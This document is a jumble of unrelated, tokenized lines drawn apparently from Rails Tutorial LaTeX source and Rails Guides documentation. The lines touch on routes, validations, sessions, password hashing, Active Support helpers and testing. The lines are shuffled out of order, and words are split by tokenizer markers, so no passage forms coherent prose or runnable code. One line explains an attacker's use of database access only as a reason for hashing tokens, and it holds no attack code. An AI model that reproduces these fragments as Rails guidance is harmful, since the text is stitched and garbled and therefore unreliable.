▁╼╼ ▁\ subsection { P r er equ i site s } ▁% ▁( fold )╼ ▁\ label { sec : prerequisites }╼╼ The re ▁are ▁no ▁form al ▁ prerequisites ▁to ▁this ▁book , ▁and ▁the ▁\ emph {
▁resources ▁: d ra f t s
▁For ▁example , ▁an ▁attacker ▁with ▁access ▁to ▁the ▁database ▁could ▁immediately ▁activate ▁new ly ▁created ▁account s , ▁there by ▁logging ▁in ▁as ▁the ▁user , ▁and ▁could ▁then ▁change ▁the ▁password ▁to ▁gain ▁control .
▁But ▁it ' s ▁enough ▁to ▁get ▁us ▁started , ▁and ▁we ' ll ▁finish ▁the ▁implementation ▁in ▁Section ~\ ref { sec : strong _ parameters } .
▁The ▁final ▁step ▁needed ▁to ▁complete ▁the ▁Users ▁resource ▁is ▁to ▁add ▁delete ▁links ▁and ▁a ▁\ k ode { destroy } ▁action .
▁If ▁you ▁ever ╼ me e t ▁them , ▁don ' t ▁ forget ▁to ▁say ▁than k s !
▁in ▁Listing ~\ ref { code : authenticated _ p } .
▁resources ▁: comments , ▁ shallow : ▁true
▁B ▖ x ▁= ▁: b
▁* ▁` action _ controller ▖ logger ` ▁Set s ▁` ActionController :: Base ▖ logger ` ▁- ▁if ▁it ' s ▁not ▁already ▁set ▁- ▁to ▁` Rails ▖ logger ` .
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁Users ▁and ▁Microposts ▁controllers .
▁The ▁documentation ▁for ▁` P er m it S crubber ` ▁and ▁` T ar get S crubber ` ▁ explain s ▁how ▁you ╼ can ▁gain ▁complete ▁control ▁over ▁when ▁and ▁how ▁elements ▁should ▁be ▁ strip ped .
▁with ▁name ▁\ k ode {" user [ email ] "} ▁is ▁precise ly ▁the ▁\ k ode { email } ▁attribute ▁of ▁the ▁\ k ode { user } ▁hash .
▁As ▁a ▁b on us , ▁by ▁using ▁base 64 ▁strings ▁specifically ▁design ed ▁to ▁be ▁ safe ▁in ▁URLs ▁( as ▁indicate d ▁by ▁the ▁name ▁\ k ode { url safe \_ base 64 }), ▁we ' ll ▁be ▁able ▁to ▁use ▁the ▁same ▁token ▁generator ▁to ▁make ▁account ▁activation ▁and ▁password ▁reset ▁links ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ resets } .
▁When ▁an ▁engine ▁is ▁created , ▁it ▁may ▁want ▁to ▁use ▁specific ▁classes ▁from ▁an ╼ application ▁to ▁provide ▁links ▁between ▁the ▁pieces ▁of ▁the ▁engine ▁and ▁the ▁pieces ▁of ╼ the ▁application ▖
▁The ▁project ' s ▁name ▁is ▁a ▁p un ▁on ▁Spork ' s ▁use ▁of ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / P OS I X } { P OS I X } ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / For k _ ( s of t w a re _ development )} { for k s } .
▁For ▁cases ▁such ▁as ▁the ▁one ▁in ▁this ▁chapter , ▁the ▁advantage ▁over ▁Active ▁Record ▁may ▁not ▁be ▁obvious , ▁but ▁we ' ll ▁use ▁more ▁advanced ▁features ▁of ▁ factor ies ▁in ▁future ▁chapter s .
▁in ▁Listing ~\ ref { code : signed _ in _ p } .
▁scope ▁: active , ▁-> ▁ { ▁ unscope ( where : ▁: state )▖ where ( state : ▁' active ') ▁ }
▁User ▁delete ▁links ▁( view able ▁only ▁by ▁admin s ) .
▁Having ▁handle d ▁invalid ▁form ▁submission s , ▁now ▁it ' s ▁time ▁to ▁complete ▁the ▁signup ▁form ▁by ▁actually ▁saving ▁a ▁new ▁user ▁( if ▁valid ) ▁to ▁the ▁database .
▁\ label { fig : custom _ help _ page } }╼\ end { figure } ╼╼% ▁subsection ▁custom _ static _ pages ▁( end )╼╼ ▁% ▁section ▁static _ pages ▁( end )╼╼ ╼ ▁\ section { Getting ▁started ▁with ▁testing } ▁% ▁( fold )╼ ▁\ label { sec : getting _ started _ with _ testing }╼╼
▁Ou r ▁main ▁testing ▁tool s ▁will ▁be ▁\ emph { controller ▁tests } ▁( start ing ▁in ▁this ▁section ), ▁\ emph { model ▁tests } ▁( start ing ▁in ▁Chapter ~\ ref { cha : modeling _ users }), ▁and ▁\ emph { integration ▁tests } ▁( start ing ▁in ▁Chapter ~\ ref { cha : sign _ up }) .
▁C ross - site ▁request ▁ forgery ▁( CSRF ) ▁ protection ▁now ▁cover s ▁GET ▁requests ▁with ╼ JavaScript ▁response s , ▁too ▖
▁We ' ll ▁define ▁the ▁ generalized ▁version ▁of ▁the ▁\ k ode { authenticated ?}\ ▁method ▁from ▁Table ~\ ref { table : password _ token _ digest } ▁in ▁Section ~\ ref { sec : activating _ the _ account } .
▁The ▁implementation ▁of ▁the ▁data ▁model ▁in ▁Figure ~\ ref { fig : user _ has _ many _ followers } ▁parallel s ▁Listing ~\ ref { code : has _ many _ following _ through _ active _ relationships } ▁exactly , ▁as ▁seen ▁in ▁Listing ~\ ref { code : has _ many _ following _ through _ passive _ relationships } .
▁d =' ex - ce 3 9 07 ' ></ span >╼ \ end { enumerate }╼╼\ begin { figure }╼\ begin { center }╼\ image { images / figures / hola _ mundo ▖ png }╼\ end { center }╼\ caption { Chang ing ▁the ▁root ▁route ▁to ▁return ▁`` ¡ H ol a , ▁ mundo !'' ▖ \ label { fig : hola _ mundo } }╼\ end { figure }╼╼\ begin { figure }╼\ begin { center }╼\ image { images / figures / goodbye _ world ▖ png }╼\ end { center }╼\ caption { Chang ing ▁the ▁root ▁route ▁to ▁return ▁`` goodbye , ▁world !'' ▖ \ label { fig : goodbye _ world } }╼\ end { figure } ╼╼% ▁subsection ▁ hello _ world ▁( end )╼╼ ▁% ▁section ▁up _ and _ running ▁( end )╼╼ ▁\ section { Version ▁control ▁with ▁Git } ▁% ▁( fold )╼ ▁\ label { sec : version _ control }╼╼
▁\ text tt { POST } ▁is ▁the ▁next ▁most ▁common ▁operation ; ▁it ▁is ▁the ▁request ▁sent ▁by ▁your ▁browser ▁when ▁you ▁submit ▁a ▁form .
▁( We ' ll ▁make ▁the ▁last ▁one ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▖)
▁* ▁` helper ` ▁defines ▁whether ▁or ▁not ▁to ▁generate ▁helpers ▖
▁These ▁actions ▁don ' t ▁typical ly ▁render ▁pages ▁( a lthough ▁they ▁some times ▁do ) ; ▁instead , ▁their ▁main ▁purpose ▁is ▁to ▁modify ▁information ▁about ▁users ▁in ▁the ▁database .
▁d ▖ end _ of _ week (: sunday ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁We ' ve ▁used ▁the ▁code ▁in ▁Listing ~\ ref { code : proto _ status _ feed } ▁instead ▁because ▁it ▁general ize s ▁much ▁more ▁natural ly ▁to ▁the ▁full ▁status ▁feed ▁needed ▁in ▁Chapter ~\ ref { cha : following _ users } .
▁# ▁ Custom ▁Rails ▁Tutorial ▁ spec s
▁A ▁partial ▁for ▁a ▁follow / unfollow ▁form .
▁We ' ll ▁fix ▁the ▁first ▁issue ▁in ▁Section ~\ ref { sec : signup _ error _ messages } ▁and ▁the ▁second ▁in ▁Section ~\ ref { sec : successful _ signup s } .
▁and ▁so ~ on .
▁ Validations ▁are ▁used ▁to ▁ensure ▁that ▁only ▁valid ▁data ▁is ▁saved ▁into ▁your ╼ database ▖
▁This ▁is ▁typical ly ▁used ▁when ▁the ▁user ▁needs ▁to ▁a g re e ▁to ▁your ╼ application ' s ▁terms ▁of ▁ service , ▁confirm ▁reading ▁some ▁text , ▁or ▁any ▁similar ╼ concept ▖
▁validates ▁: surname , ▁presence : ▁true , ▁if : ▁" name ▖ nil ? "
▁\ href { https :// www ▖ code school ▖ com /}{ Code ▁School } : ▁A ▁large ▁variety ▁of ▁inter active ▁programming ▁course s
▁xml ▖ guid (@ person ▖ fi rm ▖ account ▖ url ▁+ ▁@ recent _ items ▖ url ( item ) )
▁config ▖ assets ▖ debug ▁= ▁true
▁This ▁kind ▁of ▁code ▁requires ▁the ▁exist ence ▁of ▁a ▁\ k ode { logged \_ in ?}\ ▁boolean ▁method , ▁which ▁we ' ll ▁now ▁define .
▁Un like ▁the ▁Users ▁resource , ▁which ▁uses ▁a ▁database ▁back - end ▁( via ▁the ▁User ▁model ) ▁to ▁persist ▁data , ▁the ▁Sessions ▁resource ▁will ▁use ▁a ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / HTTP _ cookie }{\ emph { cookie } }, ▁which ▁is ▁a ▁small ▁piece ▁of ▁text ▁placed ▁on ▁the ▁user ' s ▁browser .
▁* ▁You ▁must ▁ensure ▁any ▁necessary ▁ compressor s ▁or ▁ mini fi ers ▁are ╼ available ▁on ▁your ▁development ▁system .
▁As ▁a ▁final ▁ touch , ▁we ' ll ▁fill ▁in ▁the ▁URL ▁of ▁the ▁settings ▁link ▁in ▁the ▁site ▁navigation .
▁No rm ally , ▁when ▁you ▁` dup ` ▁an ▁object ▁that ▁contains ▁other ▁objects , ▁Ruby ▁does ▁not ▁` dup ` ▁them , ▁so ▁it ▁creates ▁a ▁ shallow ▁copy ▁of ▁the ▁object ▖
▁To ▁get ▁the ▁test ▁suite ▁to ▁pass , ▁we ' ll ▁remove ▁the ▁\ k ode { provide } ▁line ▁from ▁the ▁Home ▁page ' s ▁view , ▁as ▁seen ▁in ▁Listing ~\ ref { code : home _ page _ base _ title } .
▁This ▁guide ▁cover s ▁the ▁association ▁features ▁of ▁Active ▁Record .
▁### ▁Choos ing ▁Be t we en ▁` has _ many ▁: through ` ▁and ▁` has _ and _ belongs _ to _ many `
▁Re mov ing ▁the ▁contents ▁of ▁the ▁relationship ▁fixture .
▁\ no indent ▁\ emph { Learn ▁En ough ▁Command ▁L in e ▁to ▁Be ▁D angerous } ▁is ▁an ▁introduction ▁to ▁the ▁command ▁line ▁for ▁complete ▁beginners , ▁the ▁first ▁in ▁a ▁\ href { http :// learn en ough ▖ com /}{ s er ies ▁of ▁tutorial s } ▁design ed ▁to ▁teach ▁the ▁common ▁foundation s ▁of ▁`` computer ▁magic '' ▁( Bo x ~\ ref { aside : computer _ magic }) ▁to ▁as ▁br o ad ▁an ▁a udi ence ▁as ▁possible .
▁X ▁= ▁: in _ Object
▁Create ▁a ▁file ▁called ▁` app / views / articles / edit ▖ html ▖ erb ` ▁and ▁make ╼ it ▁look ▁as ▁follows :
▁This ▁provides ▁a ▁convenient ▁way ▁to ▁display ▁a ▁ BigDecimal ▁value ▁in ▁ float ing - point ▁notation :
▁ umerate }╼╼ ▁% ▁subsection ▁the _ model _ file ▁( end )╼╼ ▁\ subsection { C re ating ▁user ▁objects } ▁% ▁( fold )╼ ▁\ label { sec : creating _ user _ objects }╼╼
▁ Second , ▁the ▁\ k ode { media } ▁argument ▁sure ▁look s ▁like ▁a ▁hash , ▁but ▁where ▁are ▁the ▁ curl y ▁braces ?
▁A ▁te mp ting ▁but ▁use less ▁definition ▁for ▁\ k ode { current \_ user } .
▁The ▁updated ▁\ k ode { Gemfile } ▁also ▁changes ▁the ▁line ▁for ▁ jQuery , ▁the ▁default ▁JavaScript ▁library ▁used ▁by ▁Rails , ▁from
▁ Technical ly , ▁it ▁look s ▁for ▁the ▁least ▁ indent ed ▁line ▁in ▁the ▁whole ▁string , ▁and ▁remove s ╼ that ▁amount ▁of ▁leading ▁whitespace .
▁class ▁Section ▁< ▁ActiveRecord :: Base
▁The ▁\ k ode { Proc file } ▁should ▁be ▁created ▁in ▁your ▁application ' s ▁root ▁directory ▁( i ▖ e ▖ , ▁in ▁the ▁same ▁location ▁as ▁the ▁\ k ode { Gemfile }) .
▁resources ▁: photos , ▁as : ▁' admin _ photos '
▁C A UT ION : ▁ Don ' t ▁use ▁` validates _ associated ` ▁on ▁both ▁end s ▁of ▁your ▁associations .
▁This ▁is ▁the ▁first ▁application ▁for
▁now ▖ all _ year
▁ ╼ ▁> > ▁@ user ▁ ||= ▁" the ▁user "
▁#### ▁` parent `
▁In ▁this ▁guide ▁you ▁will ▁learn ▁about ▁engines ▁and ▁how ▁they ▁can ▁be ▁used ▁to ▁provide ╼ additional ▁functionality ▁to ▁their ▁host ▁applications ▁through ▁a ▁clean ▁and ▁very ╼ ea sy - to - use ▁interface .
▁i ▖ increment !( : views )
▁def ▁a _ method _ used _ for _ validation _ p urpose s
▁$ ▁ echo ▁$ DAT A BASE _ URL
▁Even ▁at ▁this ▁ early ▁stage , ▁it ' s ▁helpful ▁to ▁get ▁a ▁high - level ▁ overview ▁of ▁how ▁Rails ▁applications ▁work ▁( Figure ~\ ref { fig : MVC }) .
▁Before ▁mov ing ▁on ▁to ▁t ac k le ▁any ▁of ▁the ▁application ▁extensions , ▁it ' s ▁a ▁good ▁idea ▁to ▁merge ▁in ▁your ▁changes :
▁The ▁test ▁appears ▁as ▁in ▁Listing ~\ ref { code : contact _ page _ test }, ▁which ▁simply ▁follows ▁the ▁model ▁last ▁seen ▁in ▁Listing ~\ ref { code : pages _ controller _ spec _ title } .
▁Re com m end ed ▁in ▁` config / environments / development ▖ rb ` ▁to ▁ mini m ize ▁un expect ed ▁behavior ▁when ▁ deploying ▁to ▁` production ` .
▁Here ▁are ▁some ▁suggest ion s ▁base d ▁on ▁my ▁own ▁experience :
▁# ▁Use ▁ ActiveModel ▁has _ secure _ password
▁The ▁login ▁page ▁with ▁a ▁`` forgot ▁password '' ▁link .
▁# ▁you ' ve ▁ limited ▁to ▁: test , ▁: development , ▁or ▁: production .
▁As ▁we ▁ learned ▁in ▁Section ~\ ref { sec : layouts _ and _ embedded _ ruby }, ▁the ▁\ k ode { yield } ▁method ▁insert s ▁the ▁contents ▁of ▁each ▁page ▁into ▁the ▁site ▁layout .
▁ 1234567890▖50 ▖ to _ s (: currency ) ▁# ▁=> ▁$ 1, 2 34 , 5 67 , 89 0▖5 0
▁The ▁\ k ode { show \_ follow } ▁view ▁used ▁to ▁render ▁following ▁and ▁followers .
▁You ▁may ▁prefer ▁just ▁to ▁load ▁all ▁ core ▁extensions , ▁there ▁is ▁a ▁file ▁for ▁that :
▁Defin ing ▁a ▁\ k ode { gravatar \_ for } ▁helper ▁method .
▁Testing ▁that ▁microposts ▁are ▁destroyed ▁when ▁users ▁are .
▁### ▁` squish `
▁Configuration ▁needed ▁for ▁gra ce ful ▁ de gr ad ation ▁of ▁form ▁submission .
▁The ▁solution ▁involve s ▁push ing ▁the ▁find ing ▁of ▁followed ▁user ▁id s ▁into ▁the ▁database ▁using ▁a ▁\ emph { subselect } .
▁This ▁helper ▁make s ▁build ing ▁an ▁ Atom ▁feed ▁easy ▖
▁validates ▁: g a me s _ play ed , ▁ numericality : ▁ { ▁only _ integer : ▁true ▁ }
▁{" foo " ▁=> ▁1, ▁" bar " ▁=> ▁2}▖ to _ xml
▁For ▁example , ▁a ▁new ▁Rails ▁4 ▁application ▁includes ▁a ▁default ╼` app / assets / javascripts / application ▖ js ` ▁file ▁containing ▁the ▁following ▁lines :
▁Testing ▁the ▁micropost ▁order ▖
▁Here ▁we ▁some what ▁arbitrar ily ▁arrange ▁for ▁the ▁first ▁user ▁to ▁follow ▁users ~ 3 ▁through ▁ 51 , ▁and ▁then ▁have ▁users ▁4 ▁through ▁4 1 ▁follow ▁that ▁user ▁back .
▁The ▁ additional ▁assertions ▁in ▁Listing ~\ ref { code : image _ upload _ test } ▁check ▁both ▁for ▁a ▁file ▁upload ▁field ▁on ▁the ▁Home ▁page ▁and ▁for ▁a ▁valid ▁image ▁attribute ▁on ▁the ▁micropost ▁result ing ▁from ▁valid ▁submission .
▁Let ' s ▁focus ▁on ▁one ▁particular ▁line ▁in ▁Listing ~\ ref { code : application _ layout _ redux } :
▁The ▁`: source ` ▁option ▁specifie s ▁the ▁source ▁association ▁name ▁for ▁a ▁` has _ one ▁: through ` ▁association .
▁Now ▁let ' s ▁take ▁a ▁look ▁at ▁the ▁above ▁steps ▁in ▁more ▁detail .
▁# ▁You ▁can ▁use ▁` rake ▁secret ` ▁to ▁generate ▁a ▁secure ▁secret ▁key .
▁C ur r ent ly , ▁the ▁test ▁for ▁valid ▁submission ▁should ▁be ▁failing :
▁I ▁shall ▁be ▁late !" ▖ truncate _ words ( 4 , ▁ separator : ▁ / \ s / )
▁This ▁error ▁occur s ▁because ▁the ▁route ▁needs ▁to ▁have ▁a ▁controller ▁defined ▁in ▁order ╼ to ▁serve ▁the ▁request ▖
▁The ▁Home ▁page ▁with ▁a ▁link ▁to ▁the ▁signup ▁page .
▁**` ActionDispatch :: ShowExceptions ` **
▁</ body >
▁find _ by ( re g ion _ id : ▁order _ number [ 0 ▖ ▖ 2 ])
▁ Each ▁key ▁is ▁the ▁attribute ▁name ▁and ▁the ▁value ▁is ▁an ▁array ▁of ▁strings ▁with ▁all ▁errors .
▁def ▁cache s _ action (* action s )
▁ { title : ▁" RSS ▁F e ed " }) ▁%>
▁The ▁result ing ▁tests ▁are ▁more ▁advanced ▁than ▁the ▁other s ▁we ' ve ▁seen , ▁so ▁let ' s ▁break ▁them ▁down ▁into ▁pieces ; ▁if ▁you ' re ▁new ▁to ▁RSpec , ▁you ▁m ight ▁want ▁to ▁read ▁this ▁section ▁a ▁couple ▁of ▁time s .
▁We ▁can ▁run ▁all ▁of ▁our ▁JavaScript ▁through ▁a ▁ mini m ize r ▁and ╼ concat en at or ▖
▁ CarrierWave ▁add s ▁a ▁Rails ▁generator ▁for ▁creating ▁an ▁image ▁ uploader , ▁which ▁we ' ll ▁use ▁to ▁make ▁an ▁ uploader ▁for ▁an ▁image ▁called ▁\ k ode { picture }
▁ / users /1/ following
▁In ▁Section ~\ ref { sec : activating _ the _ account }, ▁we ' ll ▁complete ▁the ▁process ▁by ▁adding ▁some ▁tests ▁and ▁then ▁doing ▁a ▁little ▁refactoring .
▁These ▁need ▁to ▁be ▁back ed ▁up ▁by ▁a ▁migration ▁to ▁create ▁the ▁` assemblies _ part s ` ▁table ▖
▁Here ▁the ▁line
▁A ▁quick ▁example ▁to ▁illustrate :
▁We ' ll ▁use ▁the ▁state - of - the - ar t ▁hash ▁function ▁called ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / B crypt } { bcrypt } ▁to ▁ ir r ever s i b ly ▁encrypt ▁the ▁password ▁to ▁form ▁the ▁password ▁hash .
▁It ▁is ▁not ▁necessary ▁to ▁create ▁a ▁new ▁ workspace .
▁This ▁will ▁generate ▁the ▁following ▁HTML :
▁By ▁default , ▁this ▁is ▁the ▁` / assets ` ▁directory .
▁0▖0 ▖ clone ▁# ▁=> ▁all o cat or ▁undefined ▁for ▁F lo at
▁remove ▁file
▁As ▁with ▁the ▁command - line ▁pro mp t , ▁the ▁\ emph { Rails ▁Tutorial } ▁uses ▁the ▁Unix ▁convention ▁for ▁directory ▁ separator s ▁( i ▖ e ▖ , ▁a ▁forward ▁ slash ~\ k ode { / }) .
▁Using ▁the ▁` config / database ▖ yml ` ▁file ▁you ▁can ▁specify ▁all ▁the ▁information ▁needed ▁to ▁access ▁your ▁database :
▁We ▁m ight ▁write ▁this ▁schematic ally ▁as ▁follows :
▁We ▁start ▁by ▁ requiring ▁a ▁User ▁object ▁to ▁respond ▁to ▁\ k ode { authenticate } :
▁This ▁\ k ode { session } ▁object ▁make s ▁the ▁user ▁id ▁available ▁from ▁page ▁to ▁page ▁by ▁storing ▁it ▁in ▁a ▁cookie ▁that ▁ expire s ▁upon ▁browser ▁close .
▁Now ▁running
▁* ▁` mail ` ▁- ▁S end s ▁the ▁actual ▁email ▁itself ▖
▁You ▁can ▁also ▁specify ▁the ▁`: shallow ` ▁option ▁in ▁the ▁ parent ▁resource , ▁in ▁which ▁case ▁all ▁of ▁the ▁nested ▁resources ▁will ▁be ▁ shallow :
▁This ▁simply ▁involve s ▁ filling ▁in ▁the ▁second ▁arguments ▁of ▁the ▁\ k ode { link \_ to } ▁function s ▁with ▁the ▁proper ▁named ▁routes .
▁| ▁| ▁50 8 ▁| ▁: lo o p _ de t ec ted ▁|
▁If ▁you ▁have ▁an ▁extension ▁that ▁should ▁be ▁ shared ▁by ▁many ▁associations , ▁you ▁can ▁use ▁a ▁named ▁extension ▁module ▖
▁We ' ll ▁see ▁in ▁just ▁a ▁moment ▁the ▁benefit s ▁of ▁adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model ▁( Section ~\ ref { sec : creating _ a _ user }), ▁but ▁first ▁we ' ll ▁add ▁a ▁minimal ▁requirement ▁on ▁password ▁security .
▁We ▁prefer ▁pull ▁requests ╼ that ▁are ▁a ▁single ▁commit ▖
▁The ▁next ▁step ▁is ▁to ▁make ▁the ▁class ▁that ▁represent s ▁a ▁` User ` ▁in ▁the ▁application ╼ custom i z able ▁for ▁the ▁engine ▖
▁$ ▁ rm ▁README ▖ rdoc
▁What ▁is ▁the ▁ Asset ▁Pipeline ?
▁A ▁test ▁for ▁the ▁\ k ode { user ▖ followed \_ users } ▁attribute .
▁Because ▁we ▁configured ▁Bundler ▁not ▁to ▁install ▁production ▁gems ▁( Section ~\ ref { sec : sample _ app _ setup }), ▁Listing ~\ ref { code : unicorn _ gemfile } ▁won ' t ▁add ▁any ▁gems ▁to ▁the ▁development ▁environment , ▁but ▁we ▁ still ▁need ▁to ▁run ▁Bundler ▁to ▁update ▁\ k ode { Gemfile ▖ lock } :
▁------------ -------- ----------------
▁ 12345 67 ▖ to _ s (: human _ size ) ▁# ▁=> ▁1▖ 18 ▁M B
▁#### ▁` last `
▁# ▁app / job s / guest s _ cleanup ▖ rb
▁**` ActionDispatch :: Static ` **
▁A ▁boolean ▁method ▁for ▁login ▁status ▁inside ▁tests .
▁#### ▁ auto _ discover y _ link _ tag
▁which ▁is ▁included ▁to ▁make ▁sure ▁that
▁get ▁' books /* section / : title ', ▁to : ▁' books # show '
▁* ▁` config ▖ action _ dispatch ▖ perform _ deep _ munge ` ▁configure s ▁whether ▁` deep _ munge `╼ ▁method ▁should ▁be ▁perform ed ▁on ▁the ▁parameters ▖
▁There ' s ▁also ▁the ▁ bang ▁variant ▁` symbolize _ keys !` ▁that ▁ symbolize s ▁keys ▁in ▁the ▁very ▁receiver .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / attribute _ accessor s ▖ rb ` .
▁You ▁can ▁use ▁the ▁`: status ` ▁option ▁to ▁change ▁this :
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products ,
▁profile ▖ name
▁Active ▁Support ▁defines ▁` Time ▖ current ` ▁to ▁be ▁ today ▁in ▁the ▁current ▁time ▁ zone ▖
▁ Learn ing ▁about ▁methods ▁such ▁as ▁\ k ode { include ?}
▁in ▁Listing ~\ ref { code : current _ user _ equal s } .
▁ delivery _ method _ options : ▁ delivery _ options )
▁would ▁match ▁` z oo / w oo / foo / bar / baz ` ▁with ▁` params [: a ]` ▁equal s ▁` ' z oo / w oo ' `, ▁and ▁` params [: b ]` ▁equal s ▁` ' bar / baz ' ` .
▁Fin ally , ▁it ' s ▁worth ▁noting ▁that , ▁in ▁the ▁common ▁case ▁that ▁single ▁and ▁double ▁ quot es ▁are ▁ essentially ▁inter change able , ▁you ' ll ▁often ▁find ▁that ▁the ▁source ▁code ▁switch es ▁between ▁the ▁two ▁without ▁any ▁apparent ▁pattern .
▁# { severity } ▁> = ▁@ level ▁# ▁D E B U G ▁> = ▁@ level
▁It ' s ▁difficult ▁to ▁be ▁confident ▁that ▁a ▁given ▁validation ▁is ▁doing ▁exactly ▁what ▁we ▁expect ▁it ▁to ▁without ▁writing ▁a ▁failing ▁test ▁and ▁then ▁getting ▁it ▁to ▁pass .
▁* ▁Then ▁in ▁your ▁view , ▁you ▁can ▁just ▁reference ▁` attachments ` ▁as ▁a ▁hash ▁and ▁specify ╼ ▁which ▁ attachment ▁you ▁want ▁to ▁show , ▁calling ▁` url ` ▁on ▁it ▁and ▁then ▁passing ▁the ╼ ▁result ▁into ▁the ▁` image _ tag ` ▁method :
▁as ▁seen ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ final } .
▁Creat ing ▁the ▁toy ▁app ▁repository ▁at ▁Bitbucket .
▁following
▁- 4 ▖ ex abytes ▁# ▁=> ▁- 4 6 1 16 8 60 18 4 27 3 87 9 04
▁number _ to _ human _ size ( 12345 67 ) ▁# ▁=> ▁1▖ 2 ▁M B
▁4 ▁examples , ▁0 ▁failure s
▁if ▁@ business ▁&& ▁@ business ▖ has _ smtp _ settings ?
▁In ▁this ▁book , ▁by ▁using ▁SQLite ▁for ▁development ▁and ▁PostgreSQL ▁( via ▁Heroku ) ▁for ▁deployment ▁( Section ~\ ref { sec : deploying }), ▁we ▁have ▁ developed ▁this ▁the me ▁even ▁further , ▁to ▁the ▁point ▁where ▁we ▁bar e ly ▁ever ▁have ▁to ▁think ▁about ▁how ▁Rails ▁store s ▁data , ▁even ▁for ▁production ▁applications .
▁user ▁= ▁User ▖ new
▁When ▁you ▁run ▁this ▁migration ▁it ▁will ▁create ╼ an ▁` articles ` ▁table ▁with ▁one ▁string ▁column ▁and ▁a ▁text ▁column ▖
▁< input ▁id =" person _ first _ name " ▁name =" person [ first _ name ] " ▁type =" text " ▁/>
▁page ▖ attachments ▖ create ( {
▁t ▖ belongs _ to ▁: ph y s ic i an
▁#### # ▁` monday `, ▁` sunday `
▁We ▁need ▁to ▁check ▁two ▁cases : ▁first , ▁users ▁who ▁are n ' t ▁logged ▁in ▁should ▁be ▁ redirected ▁to ▁the ▁login ▁page ; ▁second , ▁users ▁who ▁are ▁logged ▁in ▁but ▁who ▁are n ' t ▁admin s ▁should ▁be ▁ redirected ▁to ▁the ▁Home ▁page .
▁* ▁` config ▖ active _ record ▖ table _ name _ suffix ` ▁let s ▁you ▁set ▁a ▁ global ▁string ▁to ▁be ▁ append ed ▁to ▁table ▁names ▖
▁Recall ing ▁that ▁\ k ode { authenticate } ▁returns ▁\ k ode { false } ▁for ▁an ▁invalid ▁authentication ▁( Section ~\ ref { sec : creating _ and _ authenticating _ a _ user }), ▁our ▁strategy ▁for ▁user ▁login ▁can ▁be ▁summariz ed ▁as ▁show n ▁in ▁Listing ~\ ref { code : find _ authenticate _ user } .
▁(\ emph { Note } : ▁it ' s ▁not ▁( y e t ) ▁very ▁gra t if y ing ▖)
▁As ▁a ▁ com p r o mis e , ▁test ▁what ▁your ▁code ▁obvious ly ▁a ffect s , ▁and ▁if ▁the ▁change ▁is ╼ not ▁in ▁ railties , ▁run ▁the ▁whole ▁test ▁suite ▁of ▁the ▁a ffect ed ▁ com p on ent ▖
▁< h r >
▁<%= ▁url _ for ( host : ▁' example ▖ com ',
▁The ▁main ▁point ▁is ▁to ▁ensure ▁that ▁all ▁Rails ▁app s ▁will ▁have ▁a ▁job ▁in f ra structure ╼ in ▁place , ▁even ▁if ▁it ' s ▁in ▁the ▁form ▁of ▁an ▁" im media te ▁run n er "▖
▁Recall ing ▁the ▁\ emph { or } ~ o p er at or ▁\ text tt {||} ▁seen ▁in ▁Section ~\ ref { sec : objects _ and _ message _ passing }, ▁we ▁can ▁re write ▁this ▁as ▁follows :
▁If ▁you ▁need ▁to ▁ensure ▁some ▁particular ▁JavaScript ▁end s ▁up ╼ a bo ve ▁some ▁other ▁in ▁the ▁concatenate d ▁file , ▁require ▁the ▁pre r equ i site ▁file ▁first ╼ in ▁the ▁manifest ▖
▁Rails ▁comes ▁with ▁a ▁command - line ▁command ▁called ▁\ k ode { rails } ▁that ▁can ▁generate ▁new ▁applications ▁(\ k ode { rails ▁new }) ▁and ▁run ▁local ▁server s ▁(\ k ode { rails ▁server }) .
▁We ll , ▁there ▁will ▁ still ▁be ▁\ emph { one } ▁thing ▁left ▁that ▁we ▁don ' t ▁understand , ▁which ▁is ▁how ▁Rails ▁t ies ▁this ▁all ▁together : ▁m app ing ▁URLs ▁to ▁actions , ▁making ▁the ▁\ k ode { full \_ title } ▁helper ▁available ▁in ▁views , ▁etc ▖ ▁This ▁is ▁an ▁inter est ing ▁subject , ▁and ▁I ▁encourag e ▁you ▁to ▁in ve st ig ate ▁it ▁further , ▁but ▁know ing ▁exactly ▁\ emph { how } ▁Rails ▁works ▁is ▁not ▁necessary ▁when ▁\ emph { using } ▁Rails .
▁2▖ ordinalize ▁# ▁=> ▁" 2 nd "
▁This ▁is ▁what ▁is ▁happen ing ▁here ▖╼
▁* ▁` default ▁ Hash ` ▁- ▁This ▁is ▁a ▁hash ▁of ▁default ▁values ▁for ▁any ▁email ▁you ▁send ▁from ╼ this ▁mailer ▖
▁@ open _ orders ▁= ▁@ customer ▖ orders ▖ where ( open : ▁true ) ▁# ▁No ▁query ▁yet
▁### ▁In f le c tion s
▁Create s ▁a ▁standard ▁input ▁field ▁of ▁date ▁type .
▁non ex ist ent
▁#### # ▁` includes `
▁+ - -------- + --- ------+-------+ ------+-------+
▁remove ▁empty ▁directory
▁to ▁debug ▁the ▁error ▁using ▁the ▁Heroku ▁log file .
▁ pluralize _ table _ name s ▁?
▁class ▁Create Comments ▁< ▁ActiveRecord :: Migration
▁authentication : ▁' plain ',
▁ / signout
▁ Activ ating ▁ seed ▁users ▁by ▁default .
▁By ▁default ▁the ▁ internal ▁instance ▁variable ▁is ▁named ▁with ▁a ▁leading ▁ underscore , ▁`@ _ log _ level ` ▁in ▁the ▁example ▁above ▖
▁A ▁form ▁to ▁sign ▁up ▁new ▁users .
▁This ▁guide ▁is ▁an ▁introduction ▁to ▁Active ▁Record .
▁Here ▁we ▁have ▁reuse d ▁the ▁ shared ▁\ k ode { error \_ messages } ▁partial ▁introduce d ▁in ▁Section ~\ ref { sec : signup _ error _ messages } .
▁ 11 ▖ ▖ 27 ) ▁# ▁=> ▁false
▁We ' ve ▁come ▁a ▁long ▁way ▁since ▁introduc ing ▁the ▁Users ▁controller ▁way ▁back ▁in ▁Section ~\ ref { sec : user _ signup } .
